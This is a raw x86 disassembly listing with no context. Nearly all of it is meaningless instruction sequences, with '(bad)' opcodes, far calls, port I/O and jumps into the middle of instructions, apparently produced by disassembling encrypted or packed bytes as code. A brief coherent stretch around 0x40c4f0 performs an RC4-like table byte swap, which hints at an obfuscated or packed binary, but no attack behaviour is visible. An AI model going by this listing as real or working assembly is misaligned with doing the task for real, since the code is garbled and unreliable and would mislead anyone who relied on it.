  40c18a:	xchg   DWORD PTR [eax+0x7890d4da],ecx
  40c190:	mov    ecx,0x53970319
  40c195:	popf   
  40c196:	or     ecx,DWORD PTR [edi+0x18]
  40c199:	push   esi
  40c19a:	cmp    BYTE PTR [ecx+esi*2+0x4e],al
  40c19e:	push   ecx
  40c19f:	or     al,ah
  40c1a1:	loop   0x40c147
  40c1a3:	(bad)  
  40c1a4:	dec    ebx
  40c1a5:	outs   dx,DWORD PTR ds:[esi]
  40c1a6:	rol    DWORD PTR [edx+0x8],0xe6
  40c1aa:	cwde   
  40c1ab:	or     bl,al
  40c1ad:	sub    al,0x83
  40c1af:	por    mm5,mm1
  40c1b2:	lahf   
  40c1b3:	retf   0xa938
  40c1b6:	xlat   BYTE PTR ds:[ebx]
  40c1b7:	arpl   WORD PTR [ebp-0x28b030df],bp
  40c1bd:	enter  0x78d8,0x6f
  40c1c1:	loopne 0x40c148
  40c1c3:	in     al,0x80
  40c1c5:	sbb    eax,DWORD PTR [eax+0x6a4624d9]
  40c1cb:	push   esi
  40c1cc:	sub    eax,0xb08cbf9
  40c1d1:	int3   
  40c1d2:	jge    0x40c238
  40c1d4:	(bad)  
  40c1d6:	mov    dl,0xe6
  40c1d8:	push   ecx
  40c1d9:	xchg   ebx,eax
  40c1da:	lds    eax,FWORD PTR [edi-0x533c5462]
  40c1e0:	sub    edx,ebx
  40c1e2:	(bad)
  40c1e6:	lock lock adc DWORD PTR [ebx-0x65],0xfc610c3a
  40c1ef:	and    al,0x1e
  40c1f1:	jns    0x40c214
  40c1f3:	adc    bh,ah
  40c1f5:	push   esp
  40c1f6:	xchg   edx,eax
  40c1f7:	xor    BYTE PTR [ebp-0x6f],ah
  40c1fa:	sbb    al,0xc2
  40c1fc:	inc    ebx
  40c1fd:	lock pop edi
  40c1ff:	push   esp
  40c200:	in     al,dx
  40c201:	add    al,BYTE PTR [esi+0x5d6a619]
  40c207:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c208:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c209:	or     ch,dl
  40c20b:	test   al,0x53
  40c20d:	add    DWORD PTR [ecx+0xd],ebp
  40c210:	cdq    
  40c211:	add    cl,BYTE PTR [esi]
  40c213:	jmp    0x40c28b
  40c215:	cmp    ah,bh
  40c217:	retf   
  40c218:	xchg   ecx,eax
  40c219:	dec    esi
  40c21a:	bound  esi,QWORD PTR [esi+0x26]
  40c21d:	adc    ebp,eax
  40c21f:	stc    
  40c220:	dec    eax
  40c221:	or     bl,ch
  40c223:	loope  0x40c25f
  40c225:	jne    0x40c283
  40c227:	add    cl,cl
  40c229:	arpl   WORD PTR [eax-0x6033cf17],di
  40c22f:	mov    DWORD PTR [ebx],ebp
  40c231:	cs jo  0x40c239
  40c234:	dec    esi
  40c235:	inc    ecx
  40c236:	pop    es
  40c237:	dec    esi
  40c238:	fmul   QWORD PTR [eax]
  40c23a:	xchg   edx,eax
  40c23b:	int3   
  40c23c:	hlt    
  40c23d:	ret    0x5ace
  40c240:	bound  esp,QWORD PTR [edx+ecx*4-0x71]
  40c244:	dec    esi
  40c245:	dec    esp
  40c246:	js     0x40c248
  40c248:	jp     0x40c1d6
  40c24a:	or     al,0xa5
  40c24c:	sar    esp,1
  40c24e:	adc    BYTE PTR [eax+0x4f59fe76],dl
  40c254:	fsubr  QWORD PTR [edx+0x103bf1d1]
  40c25b:	xchg   esi,eax
  40c25c:	neg    BYTE PTR [ebx+0x780c85fc]
  40c262:	leave  
  40c263:	adc    bh,dh
  40c265:	dec    edx
  40c266:	or     esp,DWORD PTR [edx+ebp*1]
  40c269:	clc    
  40c26a:	adc    al,0x97
  40c26c:	cmp    al,0x85
  40c26e:	cmp    eax,0xc908c2fa
  40c273:	cmp    al,0xa8
  40c275:	pop    eax
  40c276:	test   BYTE PTR [edi+0x43],0xd9
  40c27a:	or     eax,0xff6c6fb4
  40c27f:	dec    ecx
  40c280:	push   cs
  40c281:	es inc esi
  40c283:	cld    
  40c284:	jg     0x40c2e7
  40c286:	(bad)  
  40c287:	pushf  
  40c288:	mov    edi,0xfeb1834b
  40c28d:	pop    eax
  40c28e:	inc    esp
  40c28f:	add    bh,dl
  40c291:	int    0x80
  40c293:	stos   BYTE PTR es:[edi],al
  40c294:	dec    edx
  40c295:	jb     0x40c2ab
  40c297:	inc    edi
  40c298:	cmp    ebp,DWORD PTR [ebp+0x3b]
  40c29b:	mov    BYTE PTR [edx+0x7a5d5f44],cl
  40c2a1:	jnp    0x40c22c
  40c2a3:	add    ah,al
  40c2a5:	fs shl al,1
  40c2a8:	mov    bl,BYTE PTR [eax+0x24a0111]
  40c2ae:	js     0x40c2fa
  40c2b0:	and    DWORD PTR [esi+eax*8],ecx
  40c2b3:	test   al,0x68
  40c2b5:	push   ds
  40c2b6:	xacquire xchg BYTE PTR [ebx+0x2294ecd2],cl
  40c2bd:	inc    ebx
  40c2be:	lea    edi,ds:0xebf6d47d
  40c2c4:	adc    edx,DWORD PTR [ecx]
  40c2c6:	stos   DWORD PTR es:[edi],eax
  40c2c7:	sub    BYTE PTR [eax+esi*2],0x9e
  40c2cb:	jb     0x40c317
  40c2cd:	cs test al,0x84
  40c2d0:	addr16 jno 0x40c34e
  40c2d3:	mov    al,ds:0x42c49ce3
  40c2d8:	inc    ebp
  40c2d9:	js     0x40c356
  40c2db:	rcr    dh,0x72
  40c2de:	jecxz  0x40c28e
  40c2e0:	bound  esp,QWORD PTR [ecx+0x687ceb4b]
  40c2e6:	add    BYTE PTR [ebx],ah
  40c2e8:	cmp    al,0x69
  40c2ea:	push   ss
  40c2eb:	nop
  40c2ec:	fwait
  40c2ed:	jno    0x40c2fe
  40c2ef:	(bad)  
  40c2f0:	fisub  DWORD PTR [edi+0x13]
  40c2f3:	cld    
  40c2f4:	pop    ebp
  40c2f5:	dec    eax
  40c2f6:	sbb    DWORD PTR [esi+eax*1-0x231b088],ebp
  40c2fd:	shr    DWORD PTR [esi-0x48d1f4ad],cl
  40c303:	push   0x23711e84
  40c308:	gs sbb eax,0x3e08712c
  40c30e:	ret    
  40c30f:	pop    ebp
  40c310:	pop    esp
  40c311:	sub    ecx,DWORD PTR [ebp-0x474f2562]
  40c317:	call   0x7ec2:0x42b477ca
  40c31e:	loope  0x40c332
  40c320:	add    esp,DWORD PTR [ebx-0x30]
  40c323:	inc    ebp
  40c324:	fld    TBYTE PTR ds:0xaed2ba5f
  40c32a:	out    dx,eax
  40c32b:	sbb    ebx,DWORD PTR [edi-0x6baed65b]
  40c331:	ror    BYTE PTR [eax],cl
  40c333:	pop    bx
  40c335:	dec    ebp
  40c336:	pop    edi
  40c337:	or     cl,BYTE PTR [ebx]
  40c339:	or     esp,DWORD PTR [eax+0x1b]
  40c33c:	cmp    edx,0x76
  40c33f:	mov    ch,0xda
  40c341:	mov    dh,0x25
  40c343:	popf   
  40c344:	enter  0xde49,0x67
  40c348:	pop    ss
  40c349:	retf   0x2e7f
  40c34c:	jnp    0x40c378
  40c34e:	sub    eax,0xe9b9e4c0
  40c353:	cmp    ebp,esp
  40c355:	adc    BYTE PTR [esi+0x29],ah
  40c358:	mov    ecx,0xb6cea468
  40c35d:	mov    dh,0x19
  40c35f:	mov    ch,0xaa
  40c361:	inc    ebp
  40c362:	mov    al,ds:0x9edf8737
  40c367:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c368:	nop    DWORD PTR [ebx+edx*4]
  40c36c:	lea    eax,[edi+0x12d2eeb9]
  40c372:	retf   0x11a1
  40c375:	sub    esi,DWORD PTR [ebx+0x1f]
  40c378:	shl    DWORD PTR [edx-0x41c3adbf],cl
  40c37e:	das    
  40c37f:	enter  0x61d6,0x98
  40c383:	mov    edi,0xc3b20e2f
  40c388:	pop    es
  40c389:	loopne 0x40c3b5
  40c38b:	adc    BYTE PTR [esi-0x6c],bh
  40c38e:	dec    esi
  40c38f:	cmp    DWORD PTR [edi+esi*4-0x3f],ecx
  40c393:	pop    ebx
  40c394:	pop    esp
  40c395:	xchg   edx,eax
  40c396:	add    ah,BYTE PTR [ebx]
  40c398:	pop    ss
  40c399:	sbb    ah,BYTE PTR [ecx+esi*4+0x155ea9fc]
  40c3a0:	jg     0x40c3b8
  40c3a2:	xchg   ebp,eax
  40c3a3:	fldcw  WORD PTR [ebx-0x37]
  40c3a6:	call   0xd84c:0xed22b171
  40c3ad:	sar    BYTE PTR [edi],cl
  40c3af:	scas   al,BYTE PTR es:[edi]
  40c3b0:	popa   
  40c3b1:	xor    dl,cl
  40c3b3:	mov    WORD PTR [ebp+esi*2+0x1c78225c],?
  40c3ba:	xor    ah,ah
  40c3bc:	xor    al,0x96
  40c3be:	(bad)  
  40c3bf:	bound  ecx,QWORD PTR [eax-0x49b4edf]
  40c3c5:	fistp  QWORD PTR [ebx-0x79]
  40c3c8:	mov    eax,ds:0xfaa236c5
  40c3cd:	push   ebp
  40c3ce:	and    eax,DWORD PTR [esi+0x22]
  40c3d1:	sub    eax,0xc122e8c9
  40c3d6:	div    BYTE PTR [esi-0xd]
  40c3d9:	mov    dh,0x71
  40c3db:	test   al,0x1d
  40c3dd:	daa    
  40c3de:	xor    al,0x3e
  40c3e0:	jne    0x40c3fb
  40c3e2:	xor    edi,DWORD PTR [ebx-0x33]
  40c3e5:	sbb    BYTE PTR [ecx-0x3641b757],0xb2
  40c3ec:	aaa    
  40c3ed:	scas   eax,DWORD PTR es:[edi]
  40c3ee:	leave  
  40c3ef:	lods   al,BYTE PTR ds:[esi]
  40c3f0:	fisubr DWORD PTR [edi-0x324100c5]
  40c3f6:	push   edx
  40c3f7:	push   0xf6d1f7c7
  40c3fc:	into   
  40c3fd:	push   ecx
  40c3fe:	fbstp  TBYTE PTR [ecx]
  40c400:	fcomp  st(4)
  40c402:	mov    bl,0xbb
  40c404:	push   ds
  40c405:	push   eax
  40c406:	adc    ecx,DWORD PTR [edx]
  40c408:	test   al,0x5b
  40c40a:	xor    DWORD PTR [edx-0x49],eax
  40c40d:	adc    al,ch
  40c40f:	mov    edx,gs
  40c411:	cwde   
  40c412:	cdq    
  40c413:	add    BYTE PTR [ecx-0x76],al
  40c416:	jle    0x40c3e0
  40c418:	test   eax,0xdf7da104
  40c41d:	ins    BYTE PTR es:[edi],dx
  40c41e:	mov    ecx,0x7ef6cc84
  40c423:	and    al,0x16
  40c425:	stc    
  40c426:	sub    ebx,edi
  40c428:	fmul   QWORD PTR [ebx+0x7a]
  40c42b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c42c:	icebp  
  40c42d:	call   0xcc0a03fe
  40c432:	mov    bh,0x8a
  40c434:	cmp    edi,DWORD PTR gs:[eax+ecx*1+0x1c]
  40c439:	sub    edi,DWORD PTR [edx]
  40c43b:	inc    BYTE PTR [edx]
  40c43d:	add    ebx,eax
  40c43f:	icebp  
  40c440:	fnstsw WORD PTR [ecx+0x1a]
  40c443:	xor    eax,0x672ff7a4
  40c448:	fsub   DWORD PTR ds:0x8750568b
  40c44e:	inc    esi
  40c44f:	pop    ecx
  40c450:	push   edi
  40c451:	repz xchg esp,esi
  40c454:	(bad)  
  40c455:	lock jg 0x40c48a
  40c458:	mov    dl,0x41
  40c45a:	fmul   st,st(2)
  40c45c:	imul   esi,DWORD PTR [esp+esi*1-0x652fecf1],0x9
  40c464:	lea    edx,[ebp+0x7e]
  40c467:	hlt    
  40c468:	add    DWORD PTR [ebp-0x3f426993],edx
  40c46e:	xor    cl,BYTE PTR [edx+0x10394362]
  40c474:	fsubr  st,st(0)
  40c476:	stos   DWORD PTR es:[edi],eax
  40c477:	test   esp,edi
  40c479:	std    
  40c47a:	mov    esp,0x8ca6f94f
  40c47f:	(bad)  
  40c480:	stos   BYTE PTR es:[edi],al
  40c481:	sahf   
  40c482:	sbb    esp,DWORD PTR [ebp+0x1b]
  40c485:	loopne 0x40c442
  40c487:	test   ecx,ebx
  40c489:	xor    DWORD PTR [ecx-0x49fc0871],0xffffff95
  40c490:	jno    0x40c424
  40c492:	popf   
  40c493:	repnz xlat BYTE PTR ds:[ebx]
  40c495:	enter  0x2446,0x22
  40c499:	cs pop esp
  40c49b:	je     0x40c42d
  40c49d:	rol    DWORD PTR [esi],1
  40c49f:	aaa    
  40c4a0:	cwde   
  40c4a1:	and    ebx,DWORD PTR [edx+eax*2+0x24760214]
  40c4a8:	push   edi
  40c4a9:	and    dl,BYTE PTR [eax-0x55]
  40c4ac:	sbb    ebp,ebp
  40c4ae:	retf   
  40c4af:	mov    bl,0xf3
  40c4b1:	call   0x9459:0x53e006d0
  40c4b8:	push   ebx
  40c4b9:	mov    ebp,0xa103de7a
  40c4be:	test   cl,0x68
  40c4c1:	add    dl,BYTE PTR [ebx]
  40c4c3:	test   BYTE PTR [edx-0x330da4ff],dh
  40c4c9:	leave  
  40c4ca:	nop
  40c4cb:	mov    ecx,0x91f5bbb9
  40c4d0:	std    
  40c4d1:	xchg   esi,eax
  40c4d2:	call   0xd3130b1b
  40c4d7:	ins    DWORD PTR es:[edi],dx
  40c4d8:	inc    ecx
  40c4d9:	jp     0x40c4d4
  40c4db:	(bad)
  40c4de:	popa   
  40c4df:	loopne 0x40c4df
  40c4e1:	cmp    esp,DWORD PTR [esi+0x3e7d2add]
  40c4e7:	(bad)  
  40c4e8:	cmp    eax,0xce4fbf74
  40c4ed:	fdivr  QWORD PTR [edx-0x8]
  40c4f0:	xor    edx,eax
  40c4f2:	add    edx,DWORD PTR [ebp-0x14]
  40c4f5:	mov    edi,DWORD PTR [ebp-0x1c]
  40c4f8:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  40c4ff:	mov    BYTE PTR [ebp+0xf],dl
  40c502:	mov    edx,DWORD PTR [ebp-0xc]
  40c505:	xor    edx,eax
  40c507:	add    edx,DWORD PTR [ebp-0x14]
  40c50a:	mov    edi,DWORD PTR [ebp-0x1c]
  40c50d:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  40c514:	mov    BYTE PTR [ebp+0xb],dl
  40c517:	mov    dl,BYTE PTR [ebp+0xf]
  40c51a:	mov    edi,DWORD PTR [ebp-0xc]
  40c51d:	xor    edi,eax
  40c51f:	add    edi,DWORD PTR [ebp-0x14]
  40c522:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c525:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  40c52c:	mov    dl,BYTE PTR [ebp+0xb]
  40c52f:	jmp    0x40c8ed
  40c534:	xchg   esp,eax
  40c535:	dec    ebp
  40c536:	push   es
  40c537:	adc    ecx,eax
  40c539:	push   ecx
  40c53a:	xchg   ebx,eax
  40c53b:	dec    ebp
  40c53c:	lock sbb cl,cl
  40c53f:	pop    edx
  40c540:	sbb    bl,BYTE PTR [ecx-0x77b2f983]
  40c546:	jo     0x40c5b8
  40c548:	lahf   
  40c549:	jge    0x40c5bb
  40c54b:	jo     0x40c561
  40c54d:	mov    bl,0xc0
  40c54f:	mov    dh,0x54
  40c551:	jl     0x40c539
  40c553:	mov    edi,0x766ce01b
  40c558:	cmp    eax,0xa1987ef0
  40c55d:	adc    BYTE PTR [ebx+0x6d593fe],dl
  40c563:	cld    
  40c564:	and    al,0xbb
  40c566:	push   ds
  40c567:	mov    ebx,0xd16aaca1
  40c56c:	cmp    al,BYTE PTR [esi+0x17]
  40c56f:	daa    
  40c570:	push   ds
  40c571:	sbb    eax,0xd47c0c15
  40c576:	adc    eax,0xee108434
  40c57b:	inc    esi
  40c57c:	hlt    
  40c57d:	push   ebp
  40c57e:	mov    esi,0xa0093c61
  40c583:	pop    edi
  40c584:	repz leave 
  40c586:	mov    dl,0x58
  40c588:	in     al,0x1f
  40c58a:	xor    ebp,DWORD PTR [ebx+0x48]
  40c58d:	jo     0x40c535
  40c58f:	sbb    BYTE PTR [eax-0x1],ah
  40c592:	pusha  
  40c593:	scas   al,BYTE PTR es:[edi]
  40c594:	push   esi
  40c595:	jg     0x40c560
  40c597:	dec    edx
  40c598:	jmp    0xa502f665
  40c59d:	xchg   esi,eax
  40c59e:	jae    0x40c59e
  40c5a0:	xchg   ebx,eax
  40c5a1:	sub    eax,0xfaf1d28
  40c5a6:	cdq    
  40c5a7:	cdq    
  40c5a8:	and    edx,eax
  40c5aa:	clc    
  40c5ab:	push   ds
  40c5ac:	pop    es
  40c5ad:	ret    0xf21d
  40c5b0:	jo     0x40c5f4
  40c5b2:	jecxz  0x40c551
  40c5b4:	dec    ebx
  40c5b5:	(bad)  
  40c5b7:	loopne 0x40c55e
  40c5b9:	add    esp,DWORD PTR [esi-0x15b551ca]
  40c5bf:	add    al,0x3a
  40c5c1:	and    ecx,DWORD PTR [esi]
  40c5c3:	sub    eax,DWORD PTR [ecx-0x4]
  40c5c6:	in     eax,0x99
  40c5c8:	test   DWORD PTR [eiz*1+0x6567b019],ebx
  40c5cf:	mov    esi,DWORD PTR [esi-0x64]
  40c5d2:	and    dh,BYTE PTR [ebp-0x15]
  40c5d5:	call   0x97e31bbc
  40c5da:	cmp    al,BYTE PTR [esi+ebp*1]
  40c5dd:	adc    BYTE PTR [edi-0x29],cl
  40c5e0:	test   eax,0x31af2694
  40c5e5:	fcmovb st,st(1)
  40c5e7:	mov    cl,0x3b
  40c5e9:	retf   0x947e
  40c5ec:	enter  0x325f,0xde
  40c5f0:	xchg   ecx,eax
  40c5f1:	xchg   edi,eax
  40c5f2:	ja     0x40c5ca
  40c5f4:	test   BYTE PTR [edi],ch
  40c5f6:	pop    es
  40c5f7:	push   es
  40c5f8:	clc    
  40c5f9:	cmp    eax,0x28a587db
  40c5fe:	pusha  
  40c5ff:	outs   dx,BYTE PTR ds:[esi]
  40c600:	push   cs
  40c601:	adc    eax,0x9a0c5139
  40c606:	xchg   esi,eax
  40c607:	mov    cl,0x44
  40c609:	sti    
  40c60a:	jno    0x40c5c7
  40c60c:	cs pop esi
  40c60e:	stc    
  40c60f:	ret    0x42c1
  40c612:	pop    ebx
  40c613:	sbb    bl,BYTE PTR [ecx-0x7c]
  40c616:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c617:	jle    0x40c646
  40c619:	out    0x1,al
  40c61b:	fbld   TBYTE PTR ds:0xe919a1b3
  40c621:	shr    BYTE PTR [ecx+ebx*2+0x3fb4ef28],1
  40c628:	adc    BYTE PTR [edx+0xc7d0c],bh
  40c62e:	cmp    ah,BYTE PTR [eax+0x4f]
  40c631:	sub    eax,0x258acc80
  40c636:	or     BYTE PTR [edx-0x4b],dl
  40c639:	sti    
  40c63a:	hlt    
  40c63b:	pop    es
  40c63c:	jbe    0x40c6a5
  40c63e:	mov    esi,0x8f123e41
  40c643:	pop    ecx
  40c644:	out    0xa1,al
  40c646:	(bad)  
  40c647:	loopne 0x40c65c
  40c649:	out    0xe5,al
  40c64b:	ins    DWORD PTR es:[edi],dx
  40c64c:	pop    edi
  40c64d:	shl    BYTE PTR [esi-0x4f],0xe6
  40c651:	jmp    0xd094:0x1df9ba51
  40c658:	adc    BYTE PTR [edx+0x7d5252b3],al
  40c65e:	hlt    
  40c65f:	and    ah,BYTE PTR [ebx+0x2738d1ab]
  40c665:	loope  0x40c68d
  40c667:	inc    esi
  40c668:	add    al,0x93
  40c66a:	cmc    
  40c66b:	and    BYTE PTR [edi-0x47],ch
  40c66e:	fdivr  st(4),st
  40c670:	dec    ecx
  40c671:	push   0x6e
  40c673:	mov    ch,BYTE PTR [esi+ecx*8]
  40c676:	or     DWORD PTR [esi+0x6e],ebx
  40c679:	jnp    0x40c61e
  40c67b:	mov    al,ds:0x1d065c14
  40c680:	leave  
  40c681:	jno    0x40c6d0
  40c683:	cmp    al,0xe6
  40c685:	aas    
  40c686:	ficom  WORD PTR [ebp-0x28]
  40c689:	sub    al,0x5a
  40c68b:	test   al,0xff
  40c68d:	fistp  DWORD PTR [eax+esi*2]
  40c690:	mov    edx,0xfc8df556
  40c695:	sar    BYTE PTR [edi-0x39bb620b],1
  40c69b:	lods   eax,DWORD PTR ds:[esi]
  40c69c:	mov    bl,BYTE PTR [edi-0x378ee515]
  40c6a2:	xor    eax,0xd17542b0
  40c6a7:	fbstp  TBYTE PTR [ebp+0x56]
  40c6aa:	jmp    0x40c647
  40c6ac:	jl     0x40c70c
  40c6ae:	dec    ebp
  40c6af:	ror    BYTE PTR [edi],0x28
  40c6b2:	cmp    al,0x47
  40c6b4:	xor    ecx,0x8acb8855
  40c6ba:	mov    cl,0x48
  40c6bc:	cmovno ecx,DWORD PTR [edx+0x72]
  40c6c0:	stos   DWORD PTR es:[edi],eax
  40c6c1:	inc    esi
  40c6c2:	xchg   esp,eax
  40c6c3:	push   ds
  40c6c4:	mov    bl,BYTE PTR [eax-0x3c0ab89d]
  40c6ca:	xchg   ebp,eax
  40c6cb:	sub    BYTE PTR es:[edx-0x16],0x29
  40c6d0:	or     edi,0xee806f45
  40c6d6:	cdq    
  40c6d7:	mov    edx,0x3b7dd950
  40c6dc:	lock iret 
  40c6de:	popf   
  40c6df:	lods   al,BYTE PTR ds:[esi]
  40c6e0:	sbb    al,0xa6
  40c6e2:	push   eax
  40c6e3:	inc    esp
  40c6e4:	ja     0x40c70d
  40c6e6:	retf   0xc3dd
  40c6e9:	into   
  40c6ea:	xchg   ebp,eax
  40c6eb:	add    al,0xca
  40c6ed:	xor    eax,0xbb8301d4
  40c6f2:	call   0x3b6a:0x54f3c9f8
  40c6f9:	mov    dh,0x3a
  40c6fb:	loopne 0x40c75d
  40c6fd:	repnz jmp 0x37df:0xc18de1bc
  40c705:	xchg   ebp,eax
  40c706:	xor    DWORD PTR [ebp-0x3a49d4a2],ebx
  40c70c:	test   BYTE PTR [ebx+0x3b591c7c],ch
  40c712:	fisub  WORD PTR [ebx+0x3f]
  40c715:	mov    eax,ds:0xb60a06c7
  40c71a:	inc    edx
  40c71b:	and    BYTE PTR [edi-0x31],bl
  40c71e:	shl    esi,cl
  40c720:	xor    eax,0x41f0fc21
  40c725:	loope  0x40c6ba
  40c727:	int    0x7
  40c729:	push   0xbb2968b8
  40c72e:	or     BYTE PTR [ebx],ch
  40c730:	push   edi
  40c731:	xchg   edi,eax
  40c732:	or     esi,DWORD PTR [ebx-0x72]
  40c735:	mov    ch,0xf3
  40c737:	push   esp
  40c738:	inc    ecx
  40c739:	or     BYTE PTR [eax+0xf949900],dh
  40c73f:	xchg   ecx,eax
  40c740:	dec    edx
  40c741:	jmp    0x40c708
  40c743:	fld    TBYTE PTR [edi-0x3229d58c]
  40c749:	out    0x8d,al
  40c74b:	iret   
  40c74c:	cdq    
  40c74d:	lds    edi,FWORD PTR [esp+edi*1]
  40c750:	ss aaa 
  40c752:	xor    ecx,DWORD PTR [edi]
  40c754:	and    al,0xa5
  40c756:	pop    edx
  40c757:	enter  0x880b,0x0
  40c75b:	bswap  ecx
  40c75d:	mov    es,WORD PTR [edx+0x79ad718f]
  40c763:	xor    bl,ah
  40c765:	aaa    
  40c766:	add    al,0xc7
  40c768:	in     eax,dx
  40c769:	dec    ebx
  40c76a:	pop    eax
  40c76b:	imul   edx,ebp,0x54ab5029
  40c771:	test   DWORD PTR [eax],edi
  40c773:	push   edi
  40c774:	jmp    0xde7299e1
  40c779:	aad    0xce
  40c77b:	gs adc DWORD PTR gs:[edx+0x6ea7ca81],edx
  40c783:	shl    edx,1
  40c785:	sar    BYTE PTR [edx],0x9e
  40c788:	retf   0x93d
  40c78b:	mov    edi,0x7f91fa0
  40c790:	cdq    
  40c791:	call   0x8811:0x56a9ba0e
  40c798:	adc    edx,edi
  40c79a:	leave  
  40c79b:	aad    0xa8
  40c79d:	aas    
  40c79e:	out    0xa3,al
  40c7a0:	repnz mov esi,0x4577bd2d
  40c7a6:	test   DWORD PTR ss:[esp+edx*8],ebp
  40c7aa:	rcl    dh,cl
  40c7ac:	ret    
  40c7ad:	out    0xa4,al
  40c7af:	push   ds
  40c7b0:	pop    edx
  40c7b1:	cmc    
  40c7b2:	jne    0x40c79c
  40c7b4:	adc    esi,DWORD PTR ds:[ecx]
  40c7b7:	push   es
  40c7b8:	idiv   BYTE PTR [edx]
  40c7ba:	std    
  40c7bb:	xchg   edx,eax
  40c7bc:	jge    0x40c7a3
  40c7be:	mov    edx,0x79ceeb5
  40c7c3:	mov    edi,0x8dc1294c
  40c7c8:	sub    ecx,DWORD PTR [ecx+0x5378710e]
  40c7ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c7cf:	(bad)  
  40c7d1:	xor    DWORD PTR [esi+0x1a545651],ecx
  40c7d7:	mov    esp,0x25a2561f
  40c7dc:	pop    es
  40c7dd:	iret   
  40c7de:	xchg   esi,eax
  40c7df:	pop    ebx
  40c7e0:	push   eax
  40c7e1:	ins    DWORD PTR es:[edi],dx
  40c7e2:	dec    ebx
  40c7e3:	pop    esi
  40c7e4:	add    al,0x68
  40c7e6:	add    edx,ebx
  40c7e8:	xchg   ebp,eax
  40c7e9:	retf   
  40c7ea:	in     eax,0xc4
  40c7ec:	push   eax
  40c7ed:	mov    edi,0xcb7726fa
  40c7f2:	movntq QWORD PTR [edx],mm4
  40c7f5:	std    
  40c7f6:	pop    ecx
  40c7f7:	rcl    DWORD PTR [edx+0x34],0x95
  40c7fb:	xor    ebp,DWORD PTR [edi-0x2779b8fc]
  40c801:	test   al,0x8a
  40c803:	or     esp,DWORD PTR [ebx+0x48]
  40c806:	arpl   sp,dx
  40c808:	push   ecx
  40c809:	mov    ecx,0x84725025
  40c80e:	mov    edx,0xc26cdd09
  40c813:	or     al,0xcb
  40c815:	js     0x40c85f
  40c817:	sbb    eax,0x2a1ebcf9
  40c81c:	into   
  40c81d:	add    DWORD PTR [edi+0x5a],ebx
  40c820:	pop    esp
  40c821:	fwait
  40c822:	sbb    eax,0x3e110df9
  40c827:	sub    esp,edx
  40c829:	(bad)  
  40c82b:	ds int3 
  40c82d:	xchg   DWORD PTR [edx-0x3d],esp
  40c830:	xor    al,0xb9
  40c832:	test   al,0x4d
  40c834:	or     al,0xfd
  40c836:	pop    ebp
  40c837:	inc    eax
  40c838:	pushf  
  40c839:	ret    0xf49f
  40c83c:	or     ebx,DWORD PTR [edi-0x3e051ade]
  40c842:	std    
  40c843:	fs push 0x68774d93
  40c849:	je     0x40c852
  40c84b:	mov    ebp,0x4a29ddcc
  40c850:	aaa    
  40c851:	dec    esi
  40c852:	xchg   edx,eax
  40c853:	add    eax,0x2bccfddd
  40c858:	mov    esp,0x9eac9c27
  40c85d:	dec    esi
  40c85e:	adc    DWORD PTR [ecx+0x23450d67],esi
  40c864:	enter  0x89db,0x16
  40c868:	loope  0x40c83d
  40c86a:	and    bh,cl
  40c86c:	xchg   esp,eax
  40c86d:	je     0x40c803
  40c86f:	inc    ebp
  40c870:	xchg   ebp,eax
  40c871:	jge    0x40c851
  40c873:	jle    0x40c7fc
  40c875:	clc    
  40c876:	inc    eax
  40c877:	sti    
  40c878:	shr    DWORD PTR [ebx+0x285acf6e],cl
  40c87e:	scas   al,BYTE PTR es:[edi]
  40c87f:	test   BYTE PTR [ecx],cl
  40c881:	jp     0x40c845
  40c883:	in     eax,dx
  40c884:	data16 repnz test al,0x93
  40c888:	jno    0x40c8f7
  40c88a:	ins    BYTE PTR es:[edi],dx
  40c88b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c88c:	pop    eax
  40c88d:	or     edi,DWORD PTR ds:0x4bafe089
  40c893:	ja     0x40c8d2
  40c895:	data16 sbb bl,BYTE PTR [edi-0x2a]
  40c899:	outs   dx,BYTE PTR ds:[esi]
  40c89a:	ja     0x40c89d
  40c89c:	das    
  40c89d:	scas   al,BYTE PTR es:[edi]
  40c89e:	mov    ch,0xcd
  40c8a0:	sbb    BYTE PTR [esi+0x10],0xd4
  40c8a4:	and    ebx,DWORD PTR [esi+0x23]
  40c8a7:	sar    BYTE PTR [ebx],0x11
  40c8aa:	sub    DWORD PTR [edx-0x3c],ecx
  40c8ad:	push   edx
  40c8ae:	mov    ebx,0xf9a7d2e
  40c8b3:	mov    ds:0xed5065aa,al
  40c8b8:	add    bl,al
  40c8ba:	push   esi
  40c8bb:	jecxz  0x40c8bc
  40c8bd:	repnz scas eax,DWORD PTR es:[edi]
  40c8bf:	fsub   DWORD PTR [edi-0x23dc95bb]
  40c8c5:	dec    esi
  40c8c6:	mov    DWORD PTR [edx+eiz*8],eax
  40c8c9:	sahf   
  40c8ca:	fisttp WORD PTR [ebp-0x6ab68e64]
  40c8d0:	rol    DWORD PTR [ecx-0x56730357],cl
  40c8d6:	ds nop
  40c8d8:	jp     0x40c939
  40c8da:	sub    DWORD PTR [ecx-0x17],0x59
  40c8de:	das    
  40c8df:	adc    al,0x46
  40c8e1:	jae    0x40c8c2
  40c8e3:	test   al,0x6e
  40c8e5:	mov    DWORD PTR [edx+edx*4],edi
  40c8e8:	fdiv   st,st(2)
  40c8ea:	xlat   BYTE PTR ds:[ebx]
  40c8eb:	xchg   edi,eax
  40c8ec:	or     DWORD PTR [ebx-0x7cc1783],0x8bec7d03
  40c8f6:	pop    ebp
  40c8f7:	in     al,0x88
  40c8f9:	xchg   esp,eax
  40c8fa:	pop    ds
  40c8fb:	pushf  
  40c8fc:	jb     0x40c930
  40c8fe:	add    BYTE PTR [ebx+0x7d8bbc55],cl
  40c904:	hlt    
  40c905:	xor    edx,eax
  40c907:	jmp    0x40ccc5
  40c90c:	sbb    al,0xba
  40c90e:	pop    edx
  40c90f:	pop    edx
  40c910:	pop    edx
  40c911:	pop    edx
  40c912:	sbb    al,0xba
  40c914:	adc    edi,DWORD PTR [edi+edi*1-0x3]
  40c918:	add    eax,0xecb27c3c
  40c91d:	xchg   esp,eax
  40c91e:	jo     0x40c990
  40c920:	lahf   
  40c921:	jge    0x40c993
